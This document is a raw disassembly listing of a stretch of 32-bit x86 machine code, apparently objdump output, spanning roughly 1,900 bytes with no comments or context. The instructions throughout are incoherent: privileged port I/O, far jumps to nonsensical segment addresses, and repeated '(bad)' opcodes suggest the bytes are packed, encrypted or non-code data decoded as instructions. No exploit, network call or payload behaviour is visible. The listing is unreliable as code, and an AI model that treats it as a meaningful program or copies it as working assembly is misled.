  409a8b:	outs   dx,DWORD PTR ds:[esi]
  409a8c:	in     eax,0x7f
  409a8e:	cwde   
  409a8f:	imul   edx,DWORD PTR [eax+0x3564743e],0x3
  409a96:	ror    BYTE PTR [esi-0x3aa9ea96],1
  409a9c:	dec    edi
  409a9d:	jp     0x409aae
  409a9f:	call   0xe12a:0xc6cf9f70
  409aa6:	(bad)  
  409aa8:	pop    edi
  409aa9:	mov    BYTE PTR [esp+ebx*1+0x88cf2d2],dh
  409ab0:	or     dl,BYTE PTR [ecx+0x1a]
  409ab3:	adc    BYTE PTR [edi-0x69d1a219],ch
  409ab9:	je     0x409ae7
  409abb:	add    eax,0x508aa419
  409ac0:	mov    bl,0x45
  409ac2:	sbb    BYTE PTR ds:0x6e494fe9,dl
  409ac8:	imul   ebp,ebx,0x345845f9
  409ace:	inc    ebp
  409acf:	test   DWORD PTR [edi-0x60],ecx
  409ad2:	xor    BYTE PTR [ebp-0x56],al
  409ad5:	or     cl,al
  409ad7:	js     0x409af9
  409ad9:	cmp    esp,DWORD PTR [esi-0x54b03c47]
  409adf:	add    al,0x18
  409ae1:	lds    ecx,FWORD PTR [edi+0x7b7b3c86]
  409ae7:	fs fwait
  409ae9:	and    DWORD PTR fs:[esi],0x39a422c8
  409af0:	mov    BYTE PTR [edx],bh
  409af2:	jmp    0xf9c7:0x616ca4b1
  409af9:	leave  
  409afa:	sbb    esp,DWORD PTR [edi+0x38]
  409afd:	jnp    0x409b0f
  409aff:	pushf  
  409b00:	icebp  
  409b01:	jmp    0x219b6584
  409b06:	jle    0x409aaa
  409b08:	jp     0x409b29
  409b0a:	fistp  DWORD PTR [ebp+ebx*1+0xa]
  409b0e:	cmp    DWORD PTR [edx+0x5a],ecx
  409b11:	and    dl,BYTE PTR [eax]
  409b13:	mov    ss,WORD PTR [edi+0x3ad87757]
  409b19:	and    DWORD PTR [edi+0x6f],edx
  409b1c:	mov    ah,0xbd
  409b1e:	xor    eax,DWORD PTR ds:0x4a98961f
  409b24:	adc    si,ax
  409b27:	icebp  
  409b28:	jecxz  0x409b55
  409b2a:	call   0x85b4:0x6b7282f5
  409b31:	pop    eax
  409b32:	inc    esp
  409b33:	cmp    eax,0xca1673b5
  409b38:	inc    esp
  409b39:	inc    ebp
  409b3a:	ficomp WORD PTR [eax]
  409b3c:	cmp    al,0xef
  409b3e:	or     BYTE PTR [eax-0x3b],0x93
  409b42:	mov    ds:0xe0367a3d,eax
  409b47:	xchg   ebp,eax
  409b48:	loop   0x409af4
  409b4a:	add    al,0x27
  409b4c:	mov    ch,0x7f
  409b4e:	mov    esi,0xbe5e5c4f
  409b53:	fwait
  409b54:	dec    ecx
  409b55:	imul   esp,DWORD PTR [eax+0x6f],0x219b1688
  409b5c:	jmp    0x409b11
  409b5e:	mov    esp,0x27f11c3f
  409b63:	xor    dh,ch
  409b65:	sub    eax,DWORD PTR [edx-0x70a628e6]
  409b6b:	sbb    eax,0x29d04e4b
  409b70:	xor    BYTE PTR ds:0xf74d90a8,0xa7
  409b77:	mov    eax,0x55cb9156
  409b7c:	cmp    al,0xc
  409b7e:	cmp    al,0xe3
  409b80:	xchg   ebp,eax
  409b81:	imul   esi,DWORD PTR [edx-0x26],0x78
  409b85:	fld    DWORD PTR [eax+0x7bad2ddc]
  409b8b:	loope  0x409b53
  409b8d:	fstp   QWORD PTR [edi-0x1b]
  409b90:	cli    
  409b91:	push   ss
  409b92:	dec    ebp
  409b93:	mov    esp,0x716e565f
  409b98:	(bad)  
  409b99:	cmp    al,0x44
  409b9b:	fistp  QWORD PTR [edi-0x5c3c22d]
  409ba1:	sub    dh,BYTE PTR [edx]
  409ba3:	inc    esi
  409ba4:	inc    esp
  409ba5:	mov    esi,0xb75318a0
  409baa:	mov    ah,0xd7
  409bac:	data16 loopne 0x409c14
  409baf:	jns    0x409bc7
  409bb1:	rol    DWORD PTR [ebp+0x16a6502a],1
  409bb7:	and    BYTE PTR [esi+0x6e],cl
  409bba:	mov    ecx,?
  409bbc:	or     cl,BYTE PTR [ecx+0x3e]
  409bbf:	mov    ds:0xba090fa9,al
  409bc4:	in     al,dx
  409bc5:	mov    eax,ds:0xd11fc74f
  409bca:	or     ebp,DWORD PTR [ebx]
  409bcc:	mul    DWORD PTR [ebx]
  409bce:	js     0x409b9b
  409bd0:	xor    al,0xd4
  409bd2:	cmp    eax,esp
  409bd4:	ins    BYTE PTR es:[edi],dx
  409bd5:	sbb    esp,DWORD PTR [ecx+0x18]
  409bd8:	jbe    0x409bff
  409bda:	clc    
  409bdb:	cmp    BYTE PTR [edx+0x113679a8],ch
  409be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409be2:	pop    esp
  409be3:	not    DWORD PTR [edi]
  409be5:	and    eax,0x7415f283
  409bea:	fistp  DWORD PTR [edx]
  409bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bed:	imul   ebp,DWORD PTR [ebp+0x5e],0xa3d991ed
  409bf4:	push   DWORD PTR [esi+0x3e]
  409bf7:	xor    ebx,0x2
  409bfa:	repz and eax,0x4f2c7936
  409c00:	push   edi
  409c01:	push   esi
  409c02:	lock fwait
  409c04:	dec    edi
  409c05:	test   DWORD PTR [eax],0xe24583d8
  409c0b:	dec    ebx
  409c0c:	cmp    DWORD PTR [edi+esi*4],ecx
  409c0f:	and    eax,0x484a565c
  409c14:	and    al,0xc7
  409c16:	outs   dx,BYTE PTR ds:[esi]
  409c18:	mov    ebp,0xdf0fd5c6
  409c1d:	mov    bl,0xdb
  409c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c20:	test   bl,0x53
  409c23:	outs   dx,BYTE PTR ds:[esi]
  409c24:	clc    
  409c25:	imul   DWORD PTR [edi+0x50340626]
  409c2b:	and    BYTE PTR ds:0x75e24bbd,0x39
  409c32:	xchg   ebp,eax
  409c33:	stos   BYTE PTR es:[edi],al
  409c34:	popf   
  409c35:	scas   al,BYTE PTR es:[edi]
  409c36:	add    eax,0xf3780602
  409c3b:	xor    DWORD PTR ds:0x71795852,esi
  409c41:	sahf   
  409c42:	jg     0x409c9a
  409c44:	sbb    ah,BYTE PTR [ecx]
  409c46:	test   BYTE PTR [eax],ah
  409c48:	sbb    BYTE PTR [edi],dl
  409c4a:	pusha  
  409c4b:	sub    esi,DWORD PTR [esi-0x75c02492]
  409c51:	ror    BYTE PTR [eax+0x10049d1c],1
  409c57:	lahf   
  409c58:	ja     0x409c8c
  409c5a:	jge    0x409cca
  409c5c:	add    BYTE PTR [edx+esi*4-0xa18ce25],bl
  409c63:	xchg   edi,eax
  409c64:	icebp  
  409c65:	jecxz  0x409c6c
  409c67:	imul   esp,DWORD PTR [edx+ebp*4-0x1a],0x5686a9a4
  409c6f:	aam    0x52
  409c71:	call   0x8f70aa13
  409c76:	jo     0x409c22
  409c78:	cmp    eax,0xb47d799b
  409c7d:	lds    esi,FWORD PTR [edi]
  409c7f:	push   eax
  409c80:	jb     0x409c74
  409c82:	or     ebp,0x6f
  409c85:	shr    DWORD PTR [edi+0x5d7ea442],cl
  409c8b:	push   0x9745ffb8
  409c90:	dec    ecx
  409c91:	and    BYTE PTR [edx+0x70],bh
  409c94:	push   edx
  409c95:	cmp    al,0xd7
  409c97:	aaa    
  409c98:	xchg   BYTE PTR [esi+eax*1],al
  409c9b:	jmp    0x409c87
  409c9d:	pop    ss
  409c9e:	jne    0x409c70
  409ca0:	xchg   esp,eax
  409ca1:	sub    dh,al
  409ca3:	sub    bh,BYTE PTR [eax]
  409ca5:	sahf   
  409ca6:	inc    ebp
  409ca7:	leave  
  409ca8:	xchg   esp,eax
  409ca9:	jecxz  0x409cf3
  409cab:	imul   ebx,DWORD PTR [edx-0x3bddcde9],0xc1f9a9bd
  409cb5:	xchg   ebp,eax
  409cb6:	pop    edi
  409cb7:	dec    esp
  409cb8:	xchg   ecx,eax
  409cb9:	mov    edi,DWORD PTR [edi]
  409cbb:	icebp  
  409cbc:	(bad)  
  409cbe:	add    al,BYTE PTR [edx+0x0]
  409cc1:	imul   esp,DWORD PTR [esi-0x60],0x2580d391
  409cc8:	call   0xe3ea645c
  409ccd:	fs call 0x60dc1ee7
  409cd3:	pusha  
  409cd4:	pop    ecx
  409cd5:	push   ds
  409cd6:	xchg   DWORD PTR [eax],ebx
  409cd8:	dec    edi
  409cd9:	bound  ebp,QWORD PTR [ecx]
  409cdb:	and    BYTE PTR [esi+0x3521fd2d],dl
  409ce1:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  409ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce4:	sbb    al,0x63
  409ce6:	loop   0x409cc8
  409ce8:	aad    0x6b
  409cea:	mov    edx,0xde872630
  409cef:	retf   0x36bb
  409cf2:	outs   dx,DWORD PTR ds:[esi]
  409cf3:	mov    ds:0xdf184ab2,al
  409cf8:	and    DWORD PTR [ebx],0x53
  409cfb:	dec    esp
  409cfc:	fs cmc 
  409cfe:	xlat   BYTE PTR ds:[ebx]
  409cff:	mov    dh,0x6a
  409d01:	lods   ax,WORD PTR ds:[esi]
  409d03:	mov    ch,0xbb
  409d05:	fld    DWORD PTR [esp+edi*1-0x6b7d24b7]
  409d0c:	mov    ebx,0x191ba92e
  409d11:	std    
  409d12:	out    0x4,al
  409d14:	dec    ecx
  409d15:	out    0xde,al
  409d17:	mov    eax,ds:0x5e9becb9
  409d1c:	in     al,0xc2
  409d1e:	int    0x99
  409d20:	clc    
  409d21:	js     0x409cb4
  409d23:	test   BYTE PTR [edx-0x7b],0x36
  409d27:	jg     0x409d3a
  409d29:	test   eax,0xfbbf19b1
  409d2e:	loop   0x409d0c
  409d30:	mov    ds:0x416a711,al
  409d35:	cmp    al,0x2a
  409d37:	xor    edx,DWORD PTR [ebx-0x4]
  409d3a:	(bad)  
  409d3b:	jg     0x409da8
  409d3d:	cwde   
  409d3e:	repz mov al,0x5
  409d41:	mov    bl,0x42
  409d43:	push   edi
  409d44:	jecxz  0x409ce4
  409d46:	test   BYTE PTR [ebx],bl
  409d48:	test   al,0x14
  409d4a:	pusha  
  409d4b:	or     BYTE PTR [edi+0x40e59c57],bh
  409d51:	add    al,0x68
  409d53:	or     al,0x49
  409d55:	popf   
  409d56:	adc    BYTE PTR [ecx-0x63],al
  409d59:	out    0xbf,eax
  409d5b:	push   esi
  409d5c:	jl     0x409db2
  409d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d5f:	retf   0x4e84
  409d62:	mov    ds:0x62dd0539,al
  409d67:	aas    
  409d68:	(bad)  
  409d69:	pop    ecx
  409d6a:	and    eax,0xf7eb03cb
  409d6f:	sbb    eax,0x8b21b0aa
  409d74:	add    dh,BYTE PTR [eax+edi*8+0x1b0a23ba]
  409d7b:	bound  edi,QWORD PTR [esi+0x695715fa]
  409d81:	push   eax
  409d82:	retf   
  409d83:	imul   esp,DWORD PTR [edi*2+0x591a2cc8],0x2c
  409d8b:	pop    ecx
  409d8c:	repz popf 
  409d8e:	nop
  409d8f:	add    al,0x83
  409d91:	jnp    0x409d2d
  409d93:	push   0xfe35637
  409d98:	push   ebx
  409d99:	js     0x409df7
  409d9b:	xchg   edi,eax
  409d9c:	or     eax,0xaee2a486
  409da1:	fwait
  409da2:	cmc    
  409da3:	jmp    0x409d6f
  409da5:	and    al,0xb1
  409da7:	inc    ebx
  409da8:	inc    edi
  409da9:	jg     0x409d69
  409dab:	sub    dh,BYTE PTR [ecx+0x5e]
  409dae:	lds    esp,FWORD PTR [ecx]
  409db0:	in     al,dx
  409db1:	std    
  409db2:	xchg   edi,eax
  409db3:	add    esi,DWORD PTR [eax+ebx*2+0x4b]
  409db7:	mov    WORD PTR [ecx],?
  409db9:	fidiv  DWORD PTR [ebx]
  409dbb:	mov    al,0xda
  409dbd:	dec    ebx
  409dbe:	in     al,0x68
  409dc0:	xchg   ecx,eax
  409dc1:	in     al,dx
  409dc2:	sub    ebp,DWORD PTR [eax+0x21]
  409dc5:	inc    ecx
  409dc6:	lods   al,BYTE PTR ds:[esi]
  409dc7:	jg     0x409e17
  409dc9:	xchg   esp,eax
  409dca:	xor    cl,al
  409dcc:	dec    edx
  409dcd:	cmp    edx,DWORD PTR [ecx-0x587cfc31]
  409dd3:	jp     0x409d6b
  409dd5:	dec    ebp
  409dd6:	pushf  
  409dd7:	ror    DWORD PTR [edi],cl
  409dd9:	push   edi
  409dda:	outs   dx,DWORD PTR ds:[esi]
  409ddb:	xchg   BYTE PTR [edi-0x4],cl
  409dde:	iret   
  409ddf:	cmp    eax,0xa495d87a
  409de4:	pop    es
  409de5:	sbb    ah,BYTE PTR [edx]
  409de7:	mov    eax,ds:0xb8e4478b
  409dec:	call   0xa6df8b20
  409df1:	fs jae 0x409d8d
  409df4:	(bad)  
  409df5:	retf   0x8e97
  409df8:	xchg   ebx,eax
  409df9:	push   eax
  409dfa:	adc    ah,bl
  409dfc:	xor    BYTE PTR [eax+0x6dca88ed],0xf1
  409e03:	arpl   WORD PTR [ecx+edx*8-0x1f],sp
  409e07:	imul   edi,esp,0xffffff8c
  409e0a:	add    DWORD PTR [esp+eax*4-0xb7aeb80],esp
  409e11:	fsubr  QWORD PTR [ebx]
  409e13:	xor    al,0xab
  409e15:	ss clc 
  409e17:	mov    edx,0xa556fa65
  409e1c:	fwait
  409e1d:	add    ebx,DWORD PTR [eax+0x34]
  409e20:	in     eax,0xf2
  409e22:	adc    DWORD PTR [edi],0xc5acda54
  409e28:	enter  0xc71,0xf5
  409e2c:	cmp    eax,DWORD PTR [edx+eax*4-0x4d]
  409e30:	outs   dx,BYTE PTR ds:[esi]
  409e31:	fstp   TBYTE PTR [ebp-0x61bcf77c]
  409e37:	(bad)  
  409e39:	sub    DWORD PTR [ebx],ebp
  409e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e3c:	push   ecx
  409e3d:	dec    edx
  409e3e:	adc    eax,0xb0ce62c5
  409e43:	jle    0x409dd1
  409e45:	dec    esp
  409e46:	mov    ebx,0x4e4d5fe0
  409e4b:	sbb    cl,BYTE PTR [eax-0x519edfb0]
  409e51:	scas   al,BYTE PTR es:[edi]
  409e52:	adc    esp,DWORD PTR gs:[edx]
  409e55:	cmp    esp,DWORD PTR [esi+0x2f20586a]
  409e5b:	mov    ch,0x3f
  409e5d:	or     BYTE PTR [edi-0x33bbe8bf],al
  409e63:	out    0x3d,eax
  409e65:	rcl    bh,0x64
  409e68:	push   ecx
  409e69:	push   0x3f5dce13
  409e6e:	lods   al,BYTE PTR ds:[esi]
  409e6f:	inc    ebx
  409e70:	fld    TBYTE PTR [ebp-0x78]
  409e73:	cmc    
  409e74:	pop    ebx
  409e75:	jno    0x409e56
  409e77:	rcl    BYTE PTR [edx],1
  409e79:	inc    ebx
  409e7a:	out    dx,al
  409e7b:	xor    BYTE PTR es:[esp+edi*1-0x14cb23ef],0x72
  409e84:	mov    edx,0xd5f8f8e8
  409e89:	aaa    
  409e8a:	popa   
  409e8b:	pop    eax
  409e8c:	cmp    BYTE PTR [esi],cl
  409e8e:	mov    edx,0xeb7fc4ea
  409e93:	(bad)  
  409e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e95:	xor    dl,bh
  409e97:	add    dh,BYTE PTR [edx]
  409e99:	ja     0x409e9e
  409e9b:	xchg   ebx,eax
  409e9c:	cmp    DWORD PTR [ebx+0x3029dbc4],ebp
  409ea2:	call   0x99fbb66c
  409ea7:	mov    DWORD PTR [edx+0x4e],ebx
  409eaa:	sub    BYTE PTR [ebx],dl
  409eac:	dec    esi
  409ead:	es mov esi,0x430a753f
  409eb3:	sahf   
  409eb4:	enter  0x8923,0x9d
  409eb8:	inc    eax
  409eb9:	cmp    al,bh
  409ebb:	(bad)  
  409ebc:	push   edi
  409ebd:	ret    0xdba2
  409ec0:	mov    bl,0x2d
  409ec2:	lea    ebp,ds:0x4f4f6a2c
  409ec8:	inc    ebp
  409ec9:	gs out dx,eax
  409ecb:	fbld   TBYTE PTR [ebx-0x1f]
  409ece:	in     eax,dx
  409ecf:	iret   
  409ed0:	imul   esp,DWORD PTR [esi],0x8
  409ed3:	rol    BYTE PTR [esi+esi*4+0x1],cl
  409ed7:	std    
  409ed8:	retf   
  409ed9:	xchg   DWORD PTR [edi+0x39],ebx
  409edc:	je     0x409f00
  409ede:	adc    eax,0x809f61a4
  409ee3:	inc    ebp
  409ee4:	push   0x567cfb50
  409ee9:	jecxz  0x409eb1
  409eeb:	jle    0x409e98
  409eed:	arpl   WORD PTR [ebx-0x21],si
  409ef0:	stc    
  409ef1:	jno    0x409ed2
  409ef3:	mov    BYTE PTR [ecx-0x75],al
  409ef6:	add    eax,DWORD PTR ds:0x1dd27b5b
  409efc:	adc    ebx,DWORD PTR [edx]
  409efe:	popf   
  409eff:	lock inc eax
  409f01:	xchg   esi,eax
  409f02:	scas   eax,DWORD PTR es:[edi]
  409f03:	inc    esp
  409f04:	xchg   ebx,eax
  409f05:	loopne 0x409ea0
  409f07:	repnz dec esp
  409f09:	mov    BYTE PTR [edx+0x51081e9],bl
  409f0f:	lods   eax,DWORD PTR ds:[esi]
  409f10:	lds    eax,FWORD PTR [edi]
  409f12:	push   ebx
  409f13:	xchg   edi,eax
  409f14:	add    DWORD PTR [ebx-0x47e8d074],esi
  409f1a:	add    bh,cl
  409f1c:	fwait
  409f1d:	xchg   ebx,eax
  409f1e:	and    eax,0x1058b00
  409f23:	pop    edi
  409f24:	xchg   esp,eax
  409f25:	bound  eax,QWORD PTR [ecx+eiz*4+0x5b6f051b]
  409f2c:	(bad)  
  409f2d:	and    eax,0xf6b3197f
  409f32:	sub    esi,DWORD PTR [esi]
  409f34:	pop    esi
  409f35:	std    
  409f36:	or     eax,0xee3baab7
  409f3b:	fsub   QWORD PTR [ebx]
  409f3d:	mov    bl,0xb
  409f3f:	or     BYTE PTR [esi+0x46088ab1],ch
  409f45:	pushf  
  409f46:	outs   dx,DWORD PTR es:[esi]
  409f48:	mov    ebx,0x7283b5b9
  409f4d:	stc    
  409f4e:	cdq    
  409f4f:	in     eax,dx
  409f50:	or     cl,ah
  409f52:	fs pop es
  409f54:	mov    DWORD PTR [ecx-0x306f1285],edi
  409f5a:	loope  0x409f7f
  409f5c:	mov    edi,0xba8c2a0c
  409f61:	into   
  409f62:	out    dx,eax
  409f63:	mov    cl,0x5c
  409f65:	jmp    0x409f56
  409f67:	cmp    BYTE PTR [edx+esi*4+0x203832f],0x7c
  409f6f:	iret   
  409f70:	mov    ebx,0x8adf3f0d
  409f75:	push   es
  409f76:	xchg   DWORD PTR [ebx],eax
  409f78:	stc    
  409f79:	sbb    ebp,DWORD PTR fs:[esi+0x431d25ce]
  409f80:	xchg   ebx,eax
  409f81:	rol    DWORD PTR [edi+edx*8+0x21f1b2cd],cl
  409f88:	leave  
  409f89:	lods   eax,DWORD PTR ds:[esi]
  409f8a:	out    dx,al
  409f8b:	dec    esi
  409f8c:	mov    bl,0xe9
  409f8e:	int3   
  409f8f:	push   edx
  409f90:	lahf   
  409f91:	cdq    
  409f92:	sbb    DWORD PTR [edx+0x3a891c48],ecx
  409f98:	add    eax,0x4fccfead
  409f9d:	out    dx,eax
  409f9e:	mov    eax,ds:0xd106b08a
  409fa3:	lock dec esp
  409fa5:	mov    esi,0x4b53737e
  409faa:	fiadd  WORD PTR [ebp-0x5c]
  409fad:	inc    esi
  409fae:	dec    ecx
  409faf:	into   
  409fb0:	(bad)  [edx+esi*2-0x6b]
  409fb4:	div    DWORD PTR [ebp+0x1ec969db]
  409fba:	jmp    0x409fb7
  409fbc:	pop    eax
  409fbd:	clc    
  409fbe:	jecxz  0x409fa8
  409fc0:	jle    0x409f88
  409fc2:	mov    bh,0xb5
  409fc4:	cmp    BYTE PTR [edi+0x32641c96],ah
  409fca:	cdq    
  409fcb:	fwait
  409fcc:	cli    
  409fcd:	sahf   
  409fce:	xchg   ecx,eax
  409fcf:	lods   eax,DWORD PTR ds:[esi]
  409fd0:	shl    BYTE PTR cs:[esi+edx*8-0x6aa05ffa],cl
  409fd8:	out    dx,eax
  409fd9:	add    eax,DWORD PTR [ebx-0x64]
  409fdc:	inc    ecx
  409fdd:	mov    bh,0x5d
  409fdf:	jno    0x409fee
  409fe1:	fbstp  TBYTE PTR [ebp-0x72]
  409fe4:	jle    0x409f89
  409fe6:	loope  0x40a047
  409fe8:	sub    edx,ebx
  409fea:	sub    DWORD PTR [edx-0x36758cae],esi
  409ff0:	int    0xe1
  409ff2:	pop    edx
  409ff3:	rcr    DWORD PTR [ebp-0x2ce76644],1
  409ff9:	rcl    BYTE PTR [edx+0x1396d4c7],1
  409fff:	(bad)  
  40a000:	jmp    0x1436ac43
  40a005:	inc    ebp
  40a006:	jae    0x40a05e
  40a008:	sub    ebp,DWORD PTR [edi-0x5b3a6796]
  40a00e:	cmp    al,0x6b
  40a010:	xlat   BYTE PTR ds:[ebx]
  40a011:	(bad)  
  40a012:	iret   
  40a013:	mov    dl,0xac
  40a015:	jnp    0x40a022
  40a017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a018:	cmp    al,0x95
  40a01a:	ror    BYTE PTR [esi],1
  40a01c:	dec    esp
  40a01d:	in     eax,dx
  40a01e:	mov    ds:0x7f0da1b3,al
  40a023:	sti    
  40a024:	pop    esi
  40a025:	(bad)
  40a029:	mov    dh,0x93
  40a02b:	pop    edx
  40a02c:	xor    edi,edi
  40a02e:	stos   BYTE PTR es:[edi],al
  40a02f:	sahf   
  40a030:	pop    ecx
  40a031:	sbb    bh,dh
  40a033:	sbb    ecx,DWORD PTR [edx]
  40a035:	xchg   BYTE PTR [edi],bl
  40a037:	xor    ecx,ecx
  40a039:	outs   dx,DWORD PTR ds:[esi]
  40a03a:	test   DWORD PTR [ebx-0x7cd7096c],edi
  40a040:	cmp    DWORD PTR [ebp+ebx*4-0x10],ebp
  40a044:	adc    dl,bh
  40a046:	xor    eax,0x7e7f5af9
  40a04b:	pop    ebp
  40a04c:	(bad)  
  40a04d:	scas   eax,DWORD PTR es:[edi]
  40a04e:	into   
  40a04f:	jae    0x40a0ad
  40a051:	mov    ecx,0x56e4c591
  40a056:	in     eax,0xfd
  40a058:	imul   edx,DWORD PTR [ebx-0x65],0xde96b7df
  40a05f:	jo     0x40a028
  40a061:	inc    esp
  40a062:	(bad)  
  40a063:	push   esi
  40a064:	int    0x41
  40a066:	scas   eax,DWORD PTR es:[edi]
  40a067:	cvttps2pi mm1,QWORD PTR [ebx]
  40a06a:	nop
  40a06b:	mov    ch,0xc4
  40a06d:	les    ebx,FWORD PTR [ebx-0x185f253b]
  40a073:	lds    edx,FWORD PTR [edi+0x4221b771]
  40a079:	pop    edx
  40a07a:	ror    ebx,0xa2
  40a07d:	stos   BYTE PTR es:[edi],al
  40a07e:	adc    al,0x1a
  40a080:	fsub   QWORD PTR [esi-0x2d]
  40a083:	icebp  
  40a084:	add    BYTE PTR [edx-0x2c78c4d9],bl
  40a08a:	pop    edi
  40a08b:	popf   
  40a08c:	jbe    0x40a0cf
  40a08e:	xchg   edi,eax
  40a08f:	in     al,dx
  40a090:	or     BYTE PTR [eax+0x24b3d010],dh
  40a096:	or     edx,edi
  40a098:	loope  0x40a0fa
  40a09a:	jns    0x40a099
  40a09c:	xchg   edi,eax
  40a09d:	jae    0x40a056
  40a09f:	jne    0x40a0c9
  40a0a1:	mov    ds:0x5f62f009,al
  40a0a6:	test   eax,0x1e226a11
  40a0ab:	pop    es
  40a0ac:	ror    DWORD PTR [edx+0x7142fd89],1
  40a0b2:	jl     0x40a049
  40a0b4:	test   cl,ch
  40a0b6:	adc    DWORD PTR [edx+ebx*2-0x36825338],0x5b
  40a0be:	aas    
  40a0bf:	stos   DWORD PTR es:[edi],eax
  40a0c0:	sub    dh,BYTE PTR [ebp+0x18f0c0f5]
  40a0c6:	push   0x536cdccc
  40a0cb:	or     ebp,DWORD PTR [esi+0x42]
  40a0ce:	out    dx,al
  40a0cf:	push   esp
  40a0d0:	jmp    0x8aaf:0x2bc9263
  40a0d7:	pushf  
  40a0d8:	sub    bh,dh
  40a0da:	xor    cl,BYTE PTR [edx]
  40a0dc:	stc    
  40a0dd:	sub    BYTE PTR [ebp+0x16],bl
  40a0e0:	pusha  
  40a0e1:	mov    dh,0xb6
  40a0e3:	push   ds
  40a0e4:	push   ecx
  40a0e5:	(bad)  [esi-0x34]
  40a0e8:	out    0xea,al
  40a0ea:	repz push ds
  40a0ec:	mov    eax,0x9100dac1
  40a0f1:	in     al,dx
  40a0f2:	imul   edi,DWORD PTR [edi+0x4c],0x91ff9ee8
  40a0f9:	dec    edx
  40a0fa:	out    0xd,al
  40a0fc:	les    eax,FWORD PTR [edx-0x17ae943f]
  40a102:	int3   
  40a103:	xchg   edx,eax
  40a104:	pop    eax
  40a105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a106:	jno    0x40a08b
  40a108:	repz dec edx
  40a10a:	std    
  40a10b:	pop    ds
  40a10c:	jge    0x40a105
  40a10e:	push   0xcc1755c3
  40a113:	ins    BYTE PTR es:[edi],dx
  40a114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a115:	cwde   
  40a116:	stos   DWORD PTR es:[edi],eax
  40a117:	mov    DWORD PTR [edi-0xd],0xbc1a58d3
  40a11e:	dec    edi
  40a11f:	xchg   edx,eax
  40a120:	jno    0x40a137
  40a122:	and    bl,cl
  40a124:	sub    al,0x69
  40a126:	call   DWORD PTR [ebp+0x19eee986]
  40a12c:	fbstp  TBYTE PTR [edi+0x2]
  40a12f:	fs aam 0x3b
  40a132:	sti    
  40a133:	faddp  st(6),st
  40a135:	push   ebp
  40a136:	xchg   esp,eax
  40a137:	mov    esi,ecx
  40a139:	mov    al,ds:0xc7f0c560
  40a13e:	mov    al,0xd1
  40a140:	jno    0x40a16b
  40a142:	jp     0x40a0c9
  40a144:	add    eax,0x4d51b601
  40a149:	lock and eax,0x69b24907
  40a14f:	test   BYTE PTR [eax-0x78],0x49
  40a153:	mov    eax,ds:0xfe284b16
  40a158:	adc    DWORD PTR [eax+eiz*1],ebx
  40a15b:	arpl   WORD PTR [ecx+0x7a688ab2],si
  40a161:	mov    al,al
  40a163:	out    dx,al
  40a164:	inc    edi
  40a165:	enter  0xa208,0xe0
  40a169:	adc    DWORD PTR [ebp+0x23],esi
  40a16c:	cmc    
  40a16d:	inc    edi
  40a16e:	into   
  40a16f:	shr    BYTE PTR [ebx],1
  40a171:	test   DWORD PTR ss:[ebp+0x10ade8f6],0x7505ae64
  40a17c:	int3   
  40a17d:	xlat   BYTE PTR ds:[ebx]
  40a17e:	in     al,dx
  40a17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a180:	xor    ebp,esp
  40a182:	push   ds
  40a183:	adc    edi,DWORD PTR [esp+ebx*4+0x49803fb0]
  40a18a:	push   0xf
  40a18c:	sbb    DWORD PTR [ebx+ecx*4+0x2e],ebx
  40a190:	lods   eax,DWORD PTR ds:[esi]
  40a191:	mul    BYTE PTR ds:0x9f042646
  40a197:	pusha  
  40a198:	shl    edi,1
  40a19a:	dec    ecx
  40a19b:	dec    edi
  40a19c:	mov    ds:0x6387643,eax
  40a1a1:	push   ebp
  40a1a2:	cli    
  40a1a3:	inc    ebx
  40a1a4:	inc    edx
  40a1a5:	jae    0x40a193
  40a1a7:	xchg   esi,eax
  40a1a8:	pop    ebx
  40a1a9:	fwait
  40a1aa:	addr16 pop edi
  40a1ac:	mov    ch,BYTE PTR [ecx-0x40]
  40a1af:	mov    esp,0x3efa6094
  40a1b4:	shl    DWORD PTR [ebx],cl
  40a1b6:	mov    dh,0x3a
  40a1b8:	daa    
  40a1b9:	jnp    0x40a1fe
  40a1bb:	aam    0xb5
  40a1bd:	div    DWORD PTR [edi+0x22]
  40a1c0:	call   0x5b929929
  40a1c5:	stos   DWORD PTR es:[edi],eax
  40a1c6:	lods   eax,DWORD PTR ds:[esi]
  40a1c7:	cli    
  40a1c8:	js     0x40a197
  40a1ca:	xchg   edx,eax
  40a1cb:	jo     0x40a17c
  40a1cd:	add    cl,0x4
  40a1d0:	and    ebx,DWORD PTR [ecx]
  40a1d2:	xchg   esi,eax
  40a1d3:	imul   esi,DWORD PTR [edi],0xffffffbc
  40a1d6:	neg    BYTE PTR [esi]
  40a1d8:	adc    ecx,esp
  40a1da:	or     DWORD PTR ds:0x4ffa98f0,eax
  40a1e0:	jg     0x40a1d0
  40a1e2:	and    al,0xce
  40a1e4:	repz clc 
  40a1e6:	cmc    
  40a1e7:	out    dx,eax
  40a1e8:	push   ecx
  40a1e9:	cld    
  40a1ea:	shl    bl,cl
  40a1ec:	xchg   DWORD PTR [ebx-0x62],eax
  40a1ef:	int3   
  40a1f0:	arpl   WORD PTR [edx-0x18],di
  40a1f3:	mov    ebx,0xe7c85d54
  40a1f8:	mov    ch,0xa0
  40a1fa:	lods   al,BYTE PTR ds:[esi]
  40a1fb:	jmp    0xa5085985
  40a200:	adc    al,0xdd
  40a202:	mov    al,ds:0x79e4feb4
  40a207:	mov    ebx,cs
  40a209:	sahf   
  40a20a:	mov    esp,DWORD PTR [esi-0x51]
  40a20d:	adc    eax,DWORD PTR ds:[ecx-0x446b7867]
  40a214:	ja     0x40a237
  40a216:	repz addr16 add al,0x88
  40a21a:	adc    esi,DWORD PTR [edx]
  40a21c:	mov    bl,0x8a
  40a21e:	loop   0x40a27a
  40a220:	fadd   QWORD PTR [ebx-0x5d]
  40a223:	xor    edx,edi
  40a225:	jp     0x40a217
  40a227:	fwait
  40a228:	adc    al,0x31
  40a22a:	daa    
  40a22b:	or     al,0xcd
  40a22d:	or     dh,cl
  40a22f:	cwde   
